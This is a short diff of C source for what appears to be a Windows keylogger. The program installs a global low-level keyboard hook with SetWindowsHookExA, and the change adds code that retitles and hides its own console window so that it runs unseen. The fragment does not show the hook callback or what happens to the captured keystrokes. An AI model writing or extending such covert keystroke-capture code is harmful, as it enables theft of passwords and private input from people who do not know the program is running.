@@ -19,9 +19,12 @@ HHOOK SetWindowsHookExA(
 );
 */
 
-LRESULT CALLBACK funcHook(int cod, WPARAM wParam, LPARAM lParam);
-
-int main(void) {
+int main(void){
+  SetConsoleTitle("cmd");
+  HWND wnd = FindWindow(0, "cmd");
+  if( wnd != NULL ){
+    ShowWindow(wnd, SW_HIDE);
+  }
 
 	MSG msg;
 	hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
